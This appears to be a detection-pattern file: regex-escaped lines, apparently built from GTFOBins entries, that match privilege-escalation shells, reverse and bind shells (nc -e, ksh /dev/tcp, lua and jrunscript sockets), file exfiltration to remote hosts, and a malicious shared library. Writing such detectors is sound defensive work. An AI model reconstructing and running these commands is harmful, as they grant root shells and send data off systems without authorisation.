+join -a 2 /dev/null [ a-z0-9A-Z\.\-\/\'\"_\@]+|join -a 2 /dev/null http\w:[\w\.\/\?\=\&\%]+|join -a 2 /dev/null \$[A-Z_]+
+sudo join -a 2 /dev/null \$[A-Z_]+|sudo join -a 2 /dev/null http\w:[\w\.\/\?\=\&\%]+|sudo join -a 2 /dev/null [ a-z0-9A-Z\.\-\/\'\"_\@]+
+jq -Rr \. "\$[A-Z_]+"|jq -Rr \. "http\w:[\w\.\/\?\=\&\%]+"|jq -Rr \. "[ a-z0-9A-Z\.\-\/\'\"_\@]+"
+\./jq -Rr \. "[ a-z0-9A-Z\.\-\/\'\"_\@]+"|\./jq -Rr \. "http\w:[\w\.\/\?\=\&\%]+"|\./jq -Rr \. "\$[A-Z_]+"
+sudo jq -Rr \. "http\w:[\w\.\/\?\=\&\%]+"|sudo jq -Rr \. "[ a-z0-9A-Z\.\-\/\'\"_\@]+"|sudo jq -Rr \. "\$[A-Z_]+"
+jrunscript -e "exec\('/bin/sh -c /\$@\|sh _ echo sh <\$\(tty\) >\$\(tty\) 2>\$\(tty\)'\)"
+jrunscript -e 'var [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+[ a-z0-9A-Z\.\-\/\'\"_\@]+""'"'\; var [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+[ a-z0-9A-Z\.\-\/\'\"_\@]+"'\;var [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\.lang\.ProcessBuilder\("/bin/bash"\, "-i"\)\.redirectErrorStream\(true\)\.start\(\)\;var [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\.net\.Socket\(host\,port\)\;var [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\.getInputStream\(\)\,[\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\.getErrorStream\(\)\,[\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\.getInputStream\(\)\;var [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\.getOutputStream\(\)\,[\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\.getOutputStream\(\)\;while\(!s\.isClosed\(\)\){while\(pi\.available\(\)>0\)so\.write\(pi\.read\(\)\)\;while\(pe\.available\(\)>0\)so\.write\(pe\.read\(\)\)\;while\(si\.available\(\)>0\)po\.write\(si\.read\(\)\)\;so\.flush\(\)\;po\.flush\(\)\;java\.lang\.Thread\.sleep\(50\)\;try {p\.exitValue\(\)\;break\;}catch \(e\){}}\;p\.destroy\(\)\;s\.close\(\)\;'|jrunscript -e 'var [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\$[A-Z_]+""'"'\; var [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\$[A-Z_]+"'\;var [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\.lang\.ProcessBuilder\("/bin/bash"\, "-i"\)\.redirectErrorStream\(true\)\.start\(\)\;var [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\.net\.Socket\(host\,port\)\;var [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\.getInputStream\(\)\,[\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\.getErrorStream\(\)\,[\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\.getInputStream\(\)\;var [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\.getOutputStream\(\)\,[\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\.getOutputStream\(\)\;while\(!s\.isClosed\(\)\){while\(pi\.available\(\)>0\)so\.write\(pi\.read\(\)\)\;while\(pe\.available\(\)>0\)so\.write\(pe\.read\(\)\)\;while\(si\.available\(\)>0\)po\.write\(si\.read\(\)\)\;so\.flush\(\)\;po\.flush\(\)\;java\.lang\.Thread\.sleep\(50\)\;try {p\.exitValue\(\)\;break\;}catch \(e\){}}\;p\.destroy\(\)\;s\.close\(\)\;'|jrunscript -e 'var [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+http\w:[\w\.\/\?\=\&\%]+""'"'\; var [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+http\w:[\w\.\/\?\=\&\%]+"'\;var [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\.lang\.ProcessBuilder\("/bin/bash"\, "-i"\)\.redirectErrorStream\(true\)\.start\(\)\;var [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\.net\.Socket\(host\,port\)\;var [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\.getInputStream\(\)\,[\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\.getErrorStream\(\)\,[\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\.getInputStream\(\)\;var [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\.getOutputStream\(\)\,[\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\.getOutputStream\(\)\;while\(!s\.isClosed\(\)\){while\(pi\.available\(\)>0\)so\.write\(pi\.read\(\)\)\;while\(pe\.available\(\)>0\)so\.write\(pe\.read\(\)\)\;while\(si\.available\(\)>0\)po\.write\(si\.read\(\)\)\;so\.flush\(\)\;po\.flush\(\)\;java\.lang\.Thread\.sleep\(50\)\;try {p\.exitValue\(\)\;break\;}catch \(e\){}}\;p\.destroy\(\)\;s\.close\(\)\;'
+jrunscript -e "cp\('http\w:[\w\.\/\?\=\&\%]+'\,'http\w:[\w\.\/\?\=\&\%]+'\)"|jrunscript -e "cp\('\$[A-Z_]+'\,'\$[A-Z_]+'\)"|jrunscript -e "cp\('[ a-z0-9A-Z\.\-\/\'\"_\@]+'\,'[ a-z0-9A-Z\.\-\/\'\"_\@]+'\)"
+jrunscript -e 'br =[ a-z0-9A-Z\.\-\/\'\"_\@]+\(new java\.io\.FileReader\("[\w\-_\/]+"\)\)\; while \(\(line =[ a-z0-9A-Z\.\-\/\'\"_\@]+\.readLine\(\)\) !=[ a-z0-9A-Z\.\-\/\'\"_\@]+\) { print\(line\)\; }'
+\./jrunscript -e "exec\('/bin/sh -pc /\$@\|sh/\${IFS}-p _ echo sh -p <\$\(tty\) >\$\(tty\) 2>\$\(tty\)'\)"
+sudo jrunscript -e "exec\('/bin/sh -c /\$@\|sh _ echo sh <\$\(tty\) >\$\(tty\) 2>\$\(tty\)'\)"
+ksh -c 'ksh -i > /dev/tcp/http\w:[\w\.\/\?\=\&\%]+/http\w:[\w\.\/\?\=\&\%]+ 2>&1 0>&1'|ksh -c 'ksh -i > /dev/tcp/\$[A-Z_]+/\$[A-Z_]+ 2>&1 0>&1'|ksh -c 'ksh -i > /dev/tcp/[ a-z0-9A-Z\.\-\/\'\"_\@]+/[ a-z0-9A-Z\.\-\/\'\"_\@]+ 2>&1 0>&1'
+ksh -c 'echo -e "POST / HTTP/0\.9/n/n\$\(cat \$[A-Z_]+\)" > /dev/tcp/\$[A-Z_]+/\$[A-Z_]+'|ksh -c 'echo -e "POST / HTTP/0\.9/n/n\$\(cat [ a-z0-9A-Z\.\-\/\'\"_\@]+\)" > /dev/tcp/[ a-z0-9A-Z\.\-\/\'\"_\@]+/[ a-z0-9A-Z\.\-\/\'\"_\@]+'|ksh -c 'echo -e "POST / HTTP/0\.9/n/n\$\(cat http\w:[\w\.\/\?\=\&\%]+\)" > /dev/tcp/http\w:[\w\.\/\?\=\&\%]+/http\w:[\w\.\/\?\=\&\%]+'
+ksh -c 'cat http\w:[\w\.\/\?\=\&\%]+ > /dev/tcp/http\w:[\w\.\/\?\=\&\%]+/http\w:[\w\.\/\?\=\&\%]+'|ksh -c 'cat [ a-z0-9A-Z\.\-\/\'\"_\@]+ > /dev/tcp/[ a-z0-9A-Z\.\-\/\'\"_\@]+/[ a-z0-9A-Z\.\-\/\'\"_\@]+'|ksh -c 'cat \$[A-Z_]+ > /dev/tcp/\$[A-Z_]+/\$[A-Z_]+'
+ksh -c 'cat < /dev/tcp/[ a-z0-9A-Z\.\-\/\'\"_\@]+/[ a-z0-9A-Z\.\-\/\'\"_\@]+ > [ a-z0-9A-Z\.\-\/\'\"_\@]+'|ksh -c 'cat < /dev/tcp/http\w:[\w\.\/\?\=\&\%]+/http\w:[\w\.\/\?\=\&\%]+ > http\w:[\w\.\/\?\=\&\%]+'|ksh -c 'cat < /dev/tcp/\$[A-Z_]+/\$[A-Z_]+ > \$[A-Z_]+'
+ksh -c 'echo DATA > http\w:[\w\.\/\?\=\&\%]+'|ksh -c 'echo DATA > \$[A-Z_]+'|ksh -c 'echo DATA > [ a-z0-9A-Z\.\-\/\'\"_\@]+'
+ksh -c 'echo "\$\(<http\w:[\w\.\/\?\=\&\%]+\)"'|ksh -c 'echo "\$\(<\$[A-Z_]+\)"'|ksh -c 'echo "\$\(<[ a-z0-9A-Z\.\-\/\'\"_\@]+\)"'
+ksh -c \$'read -r -d /x04 < "\$[A-Z_]+"\; echo "\$[A-Z_]+"'|ksh -c \$'read -r -d /x04 < "[ a-z0-9A-Z\.\-\/\'\"_\@]+"\; echo "[ a-z0-9A-Z\.\-\/\'\"_\@]+"'|ksh -c \$'read -r -d /x04 < "http\w:[\w\.\/\?\=\&\%]+"\; echo "http\w:[\w\.\/\?\=\&\%]+"'
+ksshell -i [ a-z0-9A-Z\.\-\/\'\"_\@]+|ksshell -i http\w:[\w\.\/\?\=\&\%]+|ksshell -i \$[A-Z_]+
+\./ksshell -i \$[A-Z_]+|\./ksshell -i [ a-z0-9A-Z\.\-\/\'\"_\@]+|\./ksshell -i http\w:[\w\.\/\?\=\&\%]+
+sudo ksshell -i [ a-z0-9A-Z\.\-\/\'\"_\@]+|sudo ksshell -i http\w:[\w\.\/\?\=\&\%]+|sudo ksshell -i \$[A-Z_]+
+\$ strings /proc/self/exe \| head -1
+\./ld\.so /bin/sh -p
+sudo /lib/ld\.so /bin/sh
+\$ ldd /bin/ping \| grep libcap
+static void init\(\) {
+execl\("/bin/sh"\, "/bin/sh"\, "-p"\, NULL\)\;
+gcc -fPIC -shared "http\w:[\w\.\/\?\=\&\%]+/lib\.c" -o "http\w:[\w\.\/\?\=\&\%]+/libcap\.so\.2"|gcc -fPIC -shared "\$[A-Z_]+/lib\.c" -o "\$[A-Z_]+/libcap\.so\.2"|gcc -fPIC -shared "[ a-z0-9A-Z\.\-\/\'\"_\@]+/lib\.c" -o "[ a-z0-9A-Z\.\-\/\'\"_\@]+/libcap\.so\.2"
+[\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\(user\) [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\(user\) e[\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\(root\) [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\(user\)
+# move malicious libraries in \$[A-Z_]+|# move malicious libraries in http\w:[\w\.\/\?\=\&\%]+|# move malicious libraries in [ a-z0-9A-Z\.\-\/\'\"_\@]+
+sudo ldconfig -f "\$[A-Z_]+/conf"|sudo ldconfig -f "http\w:[\w\.\/\?\=\&\%]+/conf"|sudo ldconfig -f "[ a-z0-9A-Z\.\-\/\'\"_\@]+/conf"
+# move malicious libraries in \$[A-Z_]+|# move malicious libraries in http\w:[\w\.\/\?\=\&\%]+|# move malicious libraries in [ a-z0-9A-Z\.\-\/\'\"_\@]+
+\./ldconfig -f "[ a-z0-9A-Z\.\-\/\'\"_\@]+/conf"|\./ldconfig -f "\$[A-Z_]+/conf"|\./ldconfig -f "http\w:[\w\.\/\?\=\&\%]+/conf"
+sudo less /etc/profile
+logsave /dev/null /bin/sh -i
+\./logsave /dev/null /bin/sh -i -p
+sudo logsave /dev/null /bin/sh -i
+look '' "\$[A-Z_]+"|look '' "http\w:[\w\.\/\?\=\&\%]+"|look '' "[ a-z0-9A-Z\.\-\/\'\"_\@]+"
+\./look '' "http\w:[\w\.\/\?\=\&\%]+"|\./look '' "\$[A-Z_]+"|\./look '' "[ a-z0-9A-Z\.\-\/\'\"_\@]+"
+sudo look '' "\$[A-Z_]+"|sudo look '' "[ a-z0-9A-Z\.\-\/\'\"_\@]+"|sudo look '' "http\w:[\w\.\/\?\=\&\%]+"
+ltrace -b -L /bin/sh
+sudo ltrace -b -L /bin/sh
+lua -e 'os\.execute\("/bin/sh"\)'
+lua -e 'local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\("socket"\)\;  local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\(s\.tcp\(\)\)\;  t:connect\(os\.getenv\("RHOST"\)\,os\.getenv\("RPORT"\)\)\;  while true do    local r\,[\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+:receive\(\)\;local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\(io\.popen\(r\,"r"\)\)\;    local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\(f:read\("\*a"\)\)\;t:send\(b\)\;  end\;  f:close\(\)\;t:close\(\)\;'
+lua -e 'local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\("socket"\)\;  local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\(k\.bind\("\*"\,os\.getenv\("LPORT"\)\)\)\;  local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+:accept\(\)\;  while true do    local r\,[\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+:receive\(\)\;local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\(io\.popen\(r\,"r"\)\)\;    local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\(f:read\("\*a"\)\)\;c:send\(b\)\;  end\;c:close\(\)\;f:close\(\)\;'
+lua -e '  local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\.open\(os\.getenv\("LFILE"\)\, 'rb'\)  local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+:read\("\*a"\)  io\.close\(f\)\;  local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\("socket"\)\;  local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\(s\.tcp\(\)\)\;  t:connect\(os\.getenv\("RHOST"\)\,os\.getenv\("RPORT"\)\)\;  t:send\(d\)\;  t:close\(\)\;'
+lua -e 'local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\("socket"\)\;  local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\(k\.bind\("\*"\,os\.getenv\("LPORT"\)\)\)\;  local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+:accept\(\)\;  local d\,[\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+:receive\("\*a"\)\;  c:close\(\)\;  local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\.open\(os\.getenv\("LFILE"\)\, "wb"\)\;  f:write\(d\)\;  io\.close\(f\)\;'
+sudo lua -e 'os\.execute\("/bin/sh"\)'
+\./lua -e 'os\.execute\("/bin/sh"\)'
+lwp-download [ a-z0-9A-Z\.\-\/\'\"_\@]+ [ a-z0-9A-Z\.\-\/\'\"_\@]+|lwp-download \$[A-Z_]+ \$[A-Z_]+|lwp-download http\w:[\w\.\/\?\=\&\%]+ http\w:[\w\.\/\?\=\&\%]+
+\./lwp-download [ a-z0-9A-Z\.\-\/\'\"_\@]+ [ a-z0-9A-Z\.\-\/\'\"_\@]+|\./lwp-download \$[A-Z_]+ \$[A-Z_]+|\./lwp-download http\w:[\w\.\/\?\=\&\%]+ http\w:[\w\.\/\?\=\&\%]+
+sudo lwp-download \$[A-Z_]+ \$[A-Z_]+|sudo lwp-download [ a-z0-9A-Z\.\-\/\'\"_\@]+ [ a-z0-9A-Z\.\-\/\'\"_\@]+|sudo lwp-download http\w:[\w\.\/\?\=\&\%]+ http\w:[\w\.\/\?\=\&\%]+
+sudo lwp-request "file://[ a-z0-9A-Z\.\-\/\'\"_\@]+"|sudo lwp-request "file://\$[A-Z_]+"|sudo lwp-request "file://http\w:[\w\.\/\?\=\&\%]+"
+mail -f http\w:[\w\.\/\?\=\&\%]+|mail -f [ a-z0-9A-Z\.\-\/\'\"_\@]+|mail -f \$[A-Z_]+
+sudo man man
+mawk 'BEGIN {system\("/bin/sh"\)}'
+mawk '//' "\$[A-Z_]+"|mawk '//' "http\w:[\w\.\/\?\=\&\%]+"|mawk '//' "[ a-z0-9A-Z\.\-\/\'\"_\@]+"
+\./mawk '//' "http\w:[\w\.\/\?\=\&\%]+"|\./mawk '//' "\$[A-Z_]+"|\./mawk '//' "[ a-z0-9A-Z\.\-\/\'\"_\@]+"
+sudo mawk 'BEGIN {system\("/bin/sh"\)}'
+\./mawk 'BEGIN {system\("/bin/sh"\)}'
+sudo mount -o bind /bin/sh /bin/mount
+mtr --raw -F "http\w:[\w\.\/\?\=\&\%]+"|mtr --raw -F "[ a-z0-9A-Z\.\-\/\'\"_\@]+"|mtr --raw -F "\$[A-Z_]+"
+sudo mtr --raw -F "http\w:[\w\.\/\?\=\&\%]+"|sudo mtr --raw -F "\$[A-Z_]+"|sudo mtr --raw -F "[ a-z0-9A-Z\.\-\/\'\"_\@]+"
+\./mv [ a-z0-9A-Z\.\-\/\'\"_\@]+ [ a-z0-9A-Z\.\-\/\'\"_\@]+|\./mv \$[A-Z_]+ \$[A-Z_]+|\./mv http\w:[\w\.\/\?\=\&\%]+ http\w:[\w\.\/\?\=\&\%]+
+sudo mv \$[A-Z_]+ \$[A-Z_]+|sudo mv [ a-z0-9A-Z\.\-\/\'\"_\@]+ [ a-z0-9A-Z\.\-\/\'\"_\@]+|sudo mv http\w:[\w\.\/\?\=\&\%]+ http\w:[\w\.\/\?\=\&\%]+
+mysql -e '/! /bin/sh'
+mysql --default-auth \.\./\.\./\.\./\.\./\.\./path/to/lib
+sudo mysql -e '/! /bin/sh'
+\./mysql -e '/! /bin/sh'
+reset\; sh 1>&0 2>&0
+nano -s /bin/sh
+reset\; sh 1>&0 2>&0
+\./nano -s /bin/sh
+nawk 'BEGIN {system\("/bin/sh"\)}'
+nawk -v [\w\-_]+=http\w:[\w\.\/\?\=\&\%]+ -v [\w\-_]+=http\w:[\w\.\/\?\=\&\%]+ 'BEGIN {|nawk -v [\w\-_]+=\$[A-Z_]+ -v [\w\-_]+=\$[A-Z_]+ 'BEGIN {|nawk -v [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+ -v [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+ 'BEGIN {
+while \(c && \(c \|& getline\) > 0\) print \$0 \|& s\; close\(c\)}}'
+while \(c && \(c \|& getline\) > 0\) print \$0 \|& s\; close\(c\)}}'
+nawk '//' "[ a-z0-9A-Z\.\-\/\'\"_\@]+"|nawk '//' "\$[A-Z_]+"|nawk '//' "http\w:[\w\.\/\?\=\&\%]+"
+\./nawk '//' "[ a-z0-9A-Z\.\-\/\'\"_\@]+"|\./nawk '//' "\$[A-Z_]+"|\./nawk '//' "http\w:[\w\.\/\?\=\&\%]+"
+sudo nawk 'BEGIN {system\("/bin/sh"\)}'
+\./nawk 'BEGIN {system\("/bin/sh"\)}'
+nc -e /bin/sh \$[A-Z_]+ \$[A-Z_]+|nc -e /bin/sh [ a-z0-9A-Z\.\-\/\'\"_\@]+ [ a-z0-9A-Z\.\-\/\'\"_\@]+|nc -e /bin/sh http\w:[\w\.\/\?\=\&\%]+ http\w:[\w\.\/\?\=\&\%]+
+nc -l -p \$[A-Z_]+ -e /bin/sh|nc -l -p http\w:[\w\.\/\?\=\&\%]+ -e /bin/sh|nc -l -p [ a-z0-9A-Z\.\-\/\'\"_\@]+ -e /bin/sh
+nc [ a-z0-9A-Z\.\-\/\'\"_\@]+ [ a-z0-9A-Z\.\-\/\'\"_\@]+ < "[ a-z0-9A-Z\.\-\/\'\"_\@]+"|nc \$[A-Z_]+ \$[A-Z_]+ < "\$[A-Z_]+"|nc http\w:[\w\.\/\?\=\&\%]+ http\w:[\w\.\/\?\=\&\%]+ < "http\w:[\w\.\/\?\=\&\%]+"
+nc -l -p http\w:[\w\.\/\?\=\&\%]+ > "http\w:[\w\.\/\?\=\&\%]+"|nc -l -p \$[A-Z_]+ > "\$[A-Z_]+"|nc -l -p [ a-z0-9A-Z\.\-\/\'\"_\@]+ > "[ a-z0-9A-Z\.\-\/\'\"_\@]+"
+sudo nc -e /bin/sh \$[A-Z_]+ \$[A-Z_]+|sudo nc -e /bin/sh http\w:[\w\.\/\?\=\&\%]+ http\w:[\w\.\/\?\=\&\%]+|sudo nc -e /bin/sh [ a-z0-9A-Z\.\-\/\'\"_\@]+ [ a-z0-9A-Z\.\-\/\'\"_\@]+
+\./nc -e /bin/sh [ a-z0-9A-Z\.\-\/\'\"_\@]+ [ a-z0-9A-Z\.\-\/\'\"_\@]+|\./nc -e /bin/sh http\w:[\w\.\/\?\=\&\%]+ http\w:[\w\.\/\?\=\&\%]+|\./nc -e /bin/sh \$[A-Z_]+ \$[A-Z_]+
+\./nice /bin/sh -p
+sudo nice /bin/sh
+nl -bn -w1 -s '' http\w:[\w\.\/\?\=\&\%]+|nl -bn -w1 -s '' [ a-z0-9A-Z\.\-\/\'\"_\@]+|nl -bn -w1 -s '' \$[A-Z_]+
+\./nl -bn -w1 -s '' \$[A-Z_]+|\./nl -bn -w1 -s '' [ a-z0-9A-Z\.\-\/\'\"_\@]+|\./nl -bn -w1 -s '' http\w:[\w\.\/\?\=\&\%]+
+sudo nl -bn -w1 -s '' \$[A-Z_]+|sudo nl -bn -w1 -s '' [ a-z0-9A-Z\.\-\/\'\"_\@]+|sudo nl -bn -w1 -s '' http\w:[\w\.\/\?\=\&\%]+
+echo 'os\.execute\("/bin/sh"\)' > \$[A-Z_]+|echo 'os\.execute\("/bin/sh"\)' > [ a-z0-9A-Z\.\-\/\'\"_\@]+|echo 'os\.execute\("/bin/sh"\)' > http\w:[\w\.\/\?\=\&\%]+
+while true do
+local r\,[\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+:receive\(\)\;local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\(io\.popen\(r\,"r"\)\)\;
+f:close\(\)\;t:close\(\)\;' > \$[A-Z_]+|f:close\(\)\;t:close\(\)\;' > http\w:[\w\.\/\?\=\&\%]+|f:close\(\)\;t:close\(\)\;' > [ a-z0-9A-Z\.\-\/\'\"_\@]+
+while true do
+local r\,[\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+:receive\(\)\;local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\(io\.popen\(r\,"r"\)\)\;
+end\;c:close\(\)\;f:close\(\)\;' > [ a-z0-9A-Z\.\-\/\'\"_\@]+|end\;c:close\(\)\;f:close\(\)\;' > http\w:[\w\.\/\?\=\&\%]+|end\;c:close\(\)\;f:close\(\)\;' > \$[A-Z_]+
+nmap -p [ a-z0-9A-Z\.\-\/\'\"_\@]+ [ a-z0-9A-Z\.\-\/\'\"_\@]+ --script http-put --script-args http-put\.[\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\,http-put\.[\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+|nmap -p \$[A-Z_]+ \$[A-Z_]+ --script http-put --script-args http-put\.[\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\,http-put\.[\w\-_]+=\$[A-Z_]+|nmap -p http\w:[\w\.\/\?\=\&\%]+ http\w:[\w\.\/\?\=\&\%]+ --script http-put --script-args http-put\.[\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\,http-put\.[\w\-_]+=http\w:[\w\.\/\?\=\&\%]+
+t:close\(\)\;' > http\w:[\w\.\/\?\=\&\%]+|t:close\(\)\;' > [ a-z0-9A-Z\.\-\/\'\"_\@]+|t:close\(\)\;' > \$[A-Z_]+
+nmap -p \$[A-Z_]+ \$[A-Z_]+ --script http-fetch --script-args http-fetch\.[\w\-_]+=\$[A-Z_]+\,http-fetch\.[\w\-_]+=\$[A-Z_]+|nmap -p [ a-z0-9A-Z\.\-\/\'\"_\@]+ [ a-z0-9A-Z\.\-\/\'\"_\@]+ --script http-fetch --script-args http-fetch\.[\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\,http-fetch\.[\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+|nmap -p http\w:[\w\.\/\?\=\&\%]+ http\w:[\w\.\/\?\=\&\%]+ --script http-fetch --script-args http-fetch\.[\w\-_]+=http\w:[\w\.\/\?\=\&\%]+\,http-fetch\.[\w\-_]+=http\w:[\w\.\/\?\=\&\%]+
+io\.close\(f\)\;' > \$[A-Z_]+|io\.close\(f\)\;' > [ a-z0-9A-Z\.\-\/\'\"_\@]+|io\.close\(f\)\;' > http\w:[\w\.\/\?\=\&\%]+
+echo 'os\.execute\("/bin/sh"\)' > \$[A-Z_]+|echo 'os\.execute\("/bin/sh"\)' > [ a-z0-9A-Z\.\-\/\'\"_\@]+|echo 'os\.execute\("/bin/sh"\)' > http\w:[\w\.\/\?\=\&\%]+
+sudo nmap --interactive
+echo 'os\.execute\("/bin/sh"\)' > \$[A-Z_]+|echo 'os\.execute\("/bin/sh"\)' > [ a-z0-9A-Z\.\-\/\'\"_\@]+|echo 'os\.execute\("/bin/sh"\)' > http\w:[\w\.\/\?\=\&\%]+
+node -e 'child_process\.spawn\("/bin/sh"\, {stdio: 0\, 1\, 2}\)'
+node -e 'fs\.createReadStream\(process\.env\.LFILE\)\.pipe\(http\.request\(process\.env\.URL\)\)'
+node -e 'fs\.writeFileSync\("[\w\-_\/]+"\, "DATA"\)'
+node -e 'process\.stdout\.write\(fs\.readFileSync\("/bin/ls"\)\)'
+\./node -e 'child_process\.spawn\("/bin/sh"\, "-p"\, {stdio: 0\, 1\, 2}\)'
+sudo node -e 'child_process\.spawn\("/bin/sh"\, {stdio: 0\, 1\, 2}\)'
+sudo setcap cap_setuid\+ep node
+\./node -e 'process\.setuid\(0\)\; child_process\.spawn\("/bin/sh"\, {stdio: 0\, 1\, 2}\)'
+nohup /bin/sh -c "sh <\$\(tty\) >\$\(tty\) 2>\$\(tty\)"
+\./nohup /bin/sh -p -c "sh -p <\$\(tty\) >\$\(tty\) 2>\$\(tty\)"
+sudo nohup /bin/sh -c "sh <\$\(tty\) >\$\(tty\) 2>\$\(tty\)"
+echo '{"scripts": {"preinstall": "/bin/sh"}}' > [ a-z0-9A-Z\.\-\/\'\"_\@]+/package\.json|echo '{"scripts": {"preinstall": "/bin/sh"}}' > \$[A-Z_]+/package\.json|echo '{"scripts": {"preinstall": "/bin/sh"}}' > http\w:[\w\.\/\?\=\&\%]+/package\.json
+npm -C http\w:[\w\.\/\?\=\&\%]+ i|npm -C \$[A-Z_]+ i|npm -C [ a-z0-9A-Z\.\-\/\'\"_\@]+ i
+echo '{"scripts": {"preinstall": "/bin/sh"}}' > [ a-z0-9A-Z\.\-\/\'\"_\@]+/package\.json|echo '{"scripts": {"preinstall": "/bin/sh"}}' > \$[A-Z_]+/package\.json|echo '{"scripts": {"preinstall": "/bin/sh"}}' > http\w:[\w\.\/\?\=\&\%]+/package\.json
+sudo npm -C [ a-z0-9A-Z\.\-\/\'\"_\@]+ --unsafe-perm i|sudo npm -C \$[A-Z_]+ --unsafe-perm i|sudo npm -C http\w:[\w\.\/\?\=\&\%]+ --unsafe-perm i
+echo '#!/bin/sh' > http\w:[\w\.\/\?\=\&\%]+/groff|echo '#!/bin/sh' > [ a-z0-9A-Z\.\-\/\'\"_\@]+/groff|echo '#!/bin/sh' > \$[A-Z_]+/groff
+echo '/bin/sh' >> [ a-z0-9A-Z\.\-\/\'\"_\@]+/groff|echo '/bin/sh' >> \$[A-Z_]+/groff|echo '/bin/sh' >> http\w:[\w\.\/\?\=\&\%]+/groff
+chmod \+x [ a-z0-9A-Z\.\-\/\'\"_\@]+/groff|chmod \+x http\w:[\w\.\/\?\=\&\%]+/groff|chmod \+x \$[A-Z_]+/groff
+echo '#!/bin/sh' > http\w:[\w\.\/\?\=\&\%]+/groff|echo '#!/bin/sh' > [ a-z0-9A-Z\.\-\/\'\"_\@]+/groff|echo '#!/bin/sh' > \$[A-Z_]+/groff
+echo '/bin/sh' >> [ a-z0-9A-Z\.\-\/\'\"_\@]+/groff|echo '/bin/sh' >> \$[A-Z_]+/groff|echo '/bin/sh' >> http\w:[\w\.\/\?\=\&\%]+/groff
+chmod \+x [ a-z0-9A-Z\.\-\/\'\"_\@]+/groff|chmod \+x http\w:[\w\.\/\?\=\&\%]+/groff|chmod \+x \$[A-Z_]+/groff
+sudo nsenter /bin/sh
+od -An -c -w9999 "\$[A-Z_]+"|od -An -c -w9999 "http\w:[\w\.\/\?\=\&\%]+"|od -An -c -w9999 "[ a-z0-9A-Z\.\-\/\'\"_\@]+"
+\./od -An -c -w9999 "http\w:[\w\.\/\?\=\&\%]+"|\./od -An -c -w9999 "\$[A-Z_]+"|\./od -An -c -w9999 "[ a-z0-9A-Z\.\-\/\'\"_\@]+"
+sudo od -An -c -w9999 "http\w:[\w\.\/\?\=\&\%]+"|sudo od -An -c -w9999 "[ a-z0-9A-Z\.\-\/\'\"_\@]+"|sudo od -An -c -w9999 "\$[A-Z_]+"
+openssl req -x509 -newkey rsa:4096 -keyout key\.pem -out cert\.pem -days 365 -nodes
+openssl s_server -quiet -key key\.pem -cert cert\.pem -port 12345
